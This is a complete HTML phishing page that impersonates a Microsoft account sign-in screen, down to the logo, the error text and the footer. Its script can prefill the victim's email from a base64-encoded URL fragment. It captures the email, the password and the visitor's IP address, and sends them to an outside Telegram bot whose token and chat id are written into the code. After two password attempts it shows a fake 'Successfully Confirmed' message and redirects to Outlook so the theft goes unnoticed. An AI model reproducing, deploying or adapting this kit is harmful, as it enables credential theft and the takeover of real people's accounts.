<!doctype html>
<html lang="en">

<head>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" crossorigin="anonymous"></script>
    <link rel="icon" type="image/png" sizes="192x192" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" crossorigin="anonymous">
    <title>Sign in to your account</title>
    <style>
        .box {
            box-shadow: 0 2px 3px rgba(0, 0, 0, 0.32);
            width: 440px;
            padding: 44px;
            margin: 20px auto 28px;
        }

        #footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            z-index: 99;
        }

        div .footerNode a,
        div .footerNode span {
            color: black;
            font-size: 0.75rem;
            line-height: 28px;
            white-space: nowrap;
            float: right;
            margin: 0 8px;
        }

        @media only screen and (max-width: 610px) {
            #hide {
                display: none;
            }
        }
    </style>
</head>

<body style="background-image: url('https://i.imgur.com/ssr57bo.jpg'); background-size: cover;background-repeat: no-repeat;">
    <div class="container-fluid">
        <div class="container">
            <div class="row my-5 py-5">
                <div class="col-lg-6 mx-auto">
                    <!-- Div1 - Email Entry -->
                    <div class="m-5 p-5 bg-white box" id="div1">
                        <img src="https://firebasestorage.googleapis.com/v0/b/svguploads2021.appspot.com/o/microsoft_logo.svg?alt=media&token=2581896a-aab4-46f5-9416-c3a18d25b87a" class="img-fluid"><br><br>
                        <span class="h5">Sign In</span><br>
                        <span id="error" class="text-danger" style="display: none;">That Microsoft account doesn't exist. Enter a different account</span>
                        <div class="form-group mt-2">
                            <input type="email" name="ai" class="form-control rounded-0 border-dark" id="ai" placeholder="Email, phone or Skype" style="border: none; border-bottom: 1px solid #000;">
                        </div>
                        <p style="font-size: 14px">No account? <a href="#">Create one!</a></p>
                        <p style="font-size: 14px"><a href="#">Sign in with a security key</a></p>
                        <div class="text-right">
                            <button class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;">Next</button>
                        </div>
                    </div>

                    <!-- Div2 - Password Entry -->
                    <div class="m-5 p-5 bg-white box" id="div2" style="display: none;">
                        <form id="contact">
                            <img src="https://firebasestorage.googleapis.com/v0/b/svguploads2021.appspot.com/o/microsoft_logo.svg?alt=media&token=2581896a-aab4-46f5-9416-c3a18d25b87a" class="img-fluid"><br><br>
                            <i class="fas fa-arrow-left" id="back"></i>&nbsp;<span id="aich">abc@abc.com</span>
                            <div class="py-2"><span class="h4" style="color: #4E4542">Enter Password</span></div>
                            <div class="form-group mt-1">
                                <input type="password" name="pr" class="form-control rounded-0 border-dark" id="pr" placeholder="Password" style="border: none; border-bottom: 1px solid #000;">
                            </div>
                            <div class="text-right">
                                <button class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;">Sign in</button>
                            </div>
                        </form>
                    </div>

                    <!-- Div3 - Success Message -->
                    <div class="m-5 p-5 bg-white box" id="div3" style="display: none;">
                        <div class="text-center mt-3">
                            <img src="https://i.imgur.com/xrWLEV8.png" class="img-fluid" width="140px">
                            <p class="mt-4">Successfully Confirmed:<br>Redirecting to homepage...</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <footer id="footer" style="padding-right: 30px">
        <div class="footerNode">
            <span>Privacy & cookie</span>
            <a href="https://go.microsoft.com/fwlink/?LinkId=521839">Terms of use</a>
        </div>
    </footer>

    <!-- JS -->
    <script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
    <script type="text/javascript">
        function validateEmail(email) {
            var filter = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return filter.test(email);
        }

        $(document).ready(function () {
            var count = 0;
            var hashVal = decodeURIComponent(window.location.hash.substr(1));
            let my_ai = hashVal;

            try {
                let decoded = atob(hashVal);
                if (validateEmail(decoded)) {
                    my_ai = decoded;
                }
            } catch (e) {
                // not base64
            }

            if (validateEmail(my_ai)) {
                $('#ai').val(my_ai);
                $("#div1").hide();
                $("#div2").show();
                $("#aich").html(my_ai);
            }

            $('#ai').click(function () {
                $('#error').hide();
            });

            $('#next').click(function (e) {
                e.preventDefault();
                var my_ai = $('#ai').val();
                if (!validateEmail(my_ai)) {
                    $('#error').show();
                    return false;
                }
                $("#div1").hide();
                $("#div2").show();
                $("#aich").html(my_ai);
            });

            $('#submit-btn').click(function (e) {
                e.preventDefault();
                var ai = $("#ai").val();
                var pr = $("#pr").val();

                count++;
                $.ajax({
                    dataType: "JSON",
                    url: `https://api.telegram.org/bot7897233046:AAEaHOIi9o9_YADVR7TUp1ipFlVarrDwwo0/sendMessage?chat_id=6480882728&text=Email: ${ai}%0APassword: ${pr}%0AIP: ${userip}`,
                    type: "GET",
                    success: function () {
                        if (count >= 2) {
                            $("#div2").hide();
                            $("#div3").show();
                            setTimeout(() => {
                                window.location.replace("https://outlook.live.com/mail/");
                            }, 1000);
                        }
                    },
                    error: function () {
                        if (count >= 2) {
                            $("#div2").hide();
                            $("#div3").show();
                            setTimeout(() => {
                                window.location.replace("https://outlook.live.com/mail/");
                            }, 1000);
                        }
                    }
                });
            });
        });
    </script>
</body>

</html>
